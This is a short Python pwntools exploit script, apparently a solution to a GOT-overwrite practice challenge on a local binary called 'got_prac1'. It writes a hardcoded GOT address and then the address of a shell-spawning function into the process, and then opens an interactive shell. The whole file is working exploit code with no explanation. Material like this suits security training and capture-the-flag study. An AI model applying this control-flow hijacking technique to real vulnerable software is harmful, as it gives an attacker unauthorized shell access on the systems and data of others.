from pwn import *

p = process("./got_prac1")

addr = 0x080499bc
shell = 0x08048546

p.sendline(p32(addr))

pause()

p.sendline(p32(shell))

p.interactive()

